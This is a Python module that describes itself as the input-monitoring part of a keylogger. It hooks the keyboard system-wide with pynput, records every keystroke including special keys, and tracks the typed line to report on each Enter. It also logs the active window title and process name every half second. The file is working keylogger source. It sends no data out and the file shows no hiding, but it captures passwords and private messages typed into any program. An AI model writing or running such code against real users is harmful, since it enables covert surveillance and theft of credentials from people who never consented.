"""
Input monitoring module for keylogger
Handles keyboard input capture and window title tracking
"""

import threading
import time
from datetime import datetime
from pynput import keyboard
import win32gui
import win32process
import psutil

class InputMonitor:
    def __init__(self, callback=None):
        """
        Initialize the input monitor
        
        Args:
            callback: Function to call when input is captured
        """
        self.callback = callback
        self.running = False
        self.listener = None
        self.keys = []
        self.window_titles = {}  # Window handle -> title mapping
        self.current_window = None
        self.current_line = ""  # Track the current line for command detection
        
    def start(self):
        """Start monitoring keyboard input and window titles"""
        if self.running:
            return
            
        self.running = True
        
        # Add session start to log
        self.keys.append("\n[Session started at " + datetime.now().strftime("%Y-%m-%d %H:%M:%S") + "]\n")
        self.current_line = ""  # Initialize current line
        
        # Start keyboard listener
        self.keyboard_thread = threading.Thread(target=self._start_keyboard_listener)
        self.keyboard_thread.daemon = True
        self.keyboard_thread.start()
        
        # Start window tracking
        self.window_thread = threading.Thread(target=self._track_window_titles)
        self.window_thread.daemon = True
        self.window_thread.start()
        
        # Notify callback if provided
        if self.callback:
            self.callback("start")
        
    def stop(self):
        """Stop monitoring keyboard input"""
        if not self.running:
            return
            
        self.running = False
        
        # Add session end to log
        self.keys.append("\n[Session ended at " + datetime.now().strftime("%Y-%m-%d %H:%M:%S") + "]\n")
        
        # Stop the keyboard listener
        if self.listener:
            self.listener.stop()
            
        # Notify callback if provided
        if self.callback:
            self.callback("stop")
    
    def _on_key_press(self, key):
        """Handle key press events"""
        if not self.running:
            return
    
        # Keep track of what should be added to the log
        to_add = ""
        
        try:
            # Handle regular keys
            key_char = key.char
            to_add = key_char
            self.current_line += key_char
        
        except AttributeError:
            # Handle special keys
            if key == keyboard.Key.space:
                to_add = " "
                self.current_line += " "
            elif key == keyboard.Key.enter:
                to_add = "\n"
                print(f"Enter pressed, current line: '{self.current_line}'")  # Debug print
                # Notify for command detection (current line is complete)
                if self.callback:
                    self.callback("enter_pressed", self.current_line)
                self.current_line = ""  # Reset current line after enter
            elif key == keyboard.Key.tab:
                to_add = "\t"
                self.current_line += "\t"
            elif key == keyboard.Key.backspace:
                to_add = "[BACKSPACE]"  # Log backspace as text instead of deleting
                # Also update current line by removing last character if possible
                if self.current_line:
                    self.current_line = self.current_line[:-1]
            else:
                # Other special keys: format like [KEY]
                key_name = str(key).replace("Key.", "")
                to_add = f"[{key_name.upper()}]"
    
        # Add to the log
        self.keys.append(to_add)
            
        # Notify callback if provided
        if self.callback:
            self.callback("keypress")
            
    def _start_keyboard_listener(self):
        """Start the keyboard listener"""
        self.listener = keyboard.Listener(on_press=self._on_key_press)
        self.listener.start()
        self.listener.join()
        
    def _track_window_titles(self):
        """Track active window titles and processes"""
        while self.running:
            try:
                # Get the foreground window
                window = win32gui.GetForegroundWindow()
                
                # Only process if it's a different window
                if window != self.current_window:
                    self.current_window = window
                    title = win32gui.GetWindowText(window)
                    
                    # Only process if title is not empty
                    if title:
                        # Store the window title
                        self.window_titles[window] = title
                        
                        # Get process information
                        try:
                            _, process_id = win32process.GetWindowThreadProcessId(window)
                            process_name = psutil.Process(process_id).name()
                            
                            # Log window change
                            log_entry = f"\n[Switched to: {title} ({process_name})]\n"
                            self.keys.append(log_entry)
                            self.current_line = ""  # Reset current line when window changes
                            
                            # Notify callback if provided
                            if self.callback:
                                self.callback("window_change", title, process_name)
                        except:
                            pass
            except:
                pass
                
            time.sleep(0.5)  # Check every half second
            
    def get_keys(self):
        """Get the captured keys"""
        return self.keys
        
    def get_current_window_info(self):
        """Get information about the current window"""
        if not self.current_window:
            return {"title": "Unknown", "process": "Unknown"}
            
        title = self.window_titles.get(self.current_window, "Unknown Window")
        
        try:
            _, process_id = win32process.GetWindowThreadProcessId(self.current_window)
            process_name = psutil.Process(process_id).name()
        except:
            process_name = "Unknown"
            
        return {"title": title, "process": process_name}
        
    def clear_keys(self):
        """Clear the captured keys"""
        self.keys = []
        
    def get_current_input(self):
        """Get the current input line"""
        return self.current_line